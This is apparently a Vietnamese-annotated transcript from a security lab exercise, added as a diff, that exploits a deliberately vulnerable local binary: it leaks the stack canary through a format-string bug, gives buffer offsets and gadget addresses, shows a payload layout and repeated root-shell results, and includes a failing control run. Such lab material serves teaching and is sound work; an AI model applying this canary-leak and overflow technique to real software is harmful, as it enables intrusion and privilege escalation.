@@ -1,0 +1,76 @@
+=====================================================================
+Lab 5.2 - transcript (output THAT, chay tren server verify)
+Moi truong: Ubuntu 24.04.4 LTS, glibc 2.39, gcc 13.3.0
+ASLR: randomize_va_space = 2 (bat day du; canary van tu fs:0x28, doi moi exec)
+=====================================================================
+
+$ bash build.sh
+[*] built: lab (canary ON, No PIE, NX)
+
+---------------------------------------------------------------------
+checksec
+---------------------------------------------------------------------
+$ pwn checksec lab
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+
+---------------------------------------------------------------------
+Layout (disas vuln): buf = rbp-0x50, canary = rbp-0x8
+---------------------------------------------------------------------
+  4011ca:  mov    %fs:0x28,%rax          # nap canary
+  4011d3:  mov    %rax,-0x8(%rbp)        # canary tai rbp-0x8
+  4011ed:  lea    -0x50(%rbp),%rax       # buf tai rbp-0x50
+...
+  40124e:  mov    -0x8(%rbp),%rax        # epilogue so canary
+  401252:  sub    %fs:0x28,%rax
+  40125d:  call   __stack_chk_fail@plt
+# => buf toi canary = 0x50 - 0x08 = 0x48 = 72 byte
+#    buf toi saved RIP = 0x50 + 8 = 0x58 = 88 byte
+$ nm lab | grep ' win$' ; ROPgadget --binary lab | grep ': ret$' | head -1
+0000000000401176 T win
+0x000000000040101a : ret
+
+---------------------------------------------------------------------
+Tim format offset cua canary: ban %6$p..%16$p, tim gia tri 8 byte ket thuc 00
+---------------------------------------------------------------------
+# input: %6$p|%7$p|...|%16$p
+echo> 0x2437257c70243625|...|0x7024363125|0x403e00|0xcd9986b3e842200|0x7fffffffeaa0
+#      %6..%13 la chinh chuoi format tren stack (ascii) ;
+#      %14 = 0x403e00 (con tro image) ;
+#      %15 = 0xcd9986b3e842200  <-- CANARY (ket thuc 00) ;
+#      %16 = 0x7fffffffeaa0     (saved RBP, con tro stack)
+# => canary o format offset 15.
+
+---------------------------------------------------------------------
+exploit.py: leak canary (%15$p) -> overflow ghi lai canary -> win -> shell
+---------------------------------------------------------------------
+$ python3 exploit.py
+[+] Starting local process './lab': pid ...
+[+] canary = 0x4e95b43c20ae6c00
+[*] Loaded 5 cached gadgets for './lab'
+[*] Stopped process './lab'
+===SHELL_OK===
+uid=0(root) gid=0(root) groups=0(root)
+
+---------------------------------------------------------------------
+Chay 3 lan: canary doi moi lan (random), exploit LEAK LAI nen van an dinh
+---------------------------------------------------------------------
+run 1: canary = 0xd31cea7d73e73500  -> ===SHELL_OK=== uid=0(root) ...
+run 2: canary = 0x7116ecd5c97eb00   -> ===SHELL_OK=== uid=0(root) ...
+run 3: canary = 0x1c1d5672355abf00  -> ===SHELL_OK=== uid=0(root) ...
+# Moi canary deu ket thuc byte 00 (thiet ke glibc x86-64).
+
+---------------------------------------------------------------------
+Doi chung: overflow KHONG ghi lai dung canary (ghi CCCCCCCC) -> abort
+---------------------------------------------------------------------
+$ # payload = 'A'*72 + 'C'*8 (canary sai) + 'B'*8 + win
+*** stack smashing detected ***: terminated
+
+# KET QUA: leak canary qua format string (offset 15), ghi lai dung canary khi
+# overflow, chen 1 gadget `ret` can stack 16 byte, nhay win() -> shell root.
+# Neu khong ghi lai dung canary thi __stack_chk_fail abort ("stack smashing").
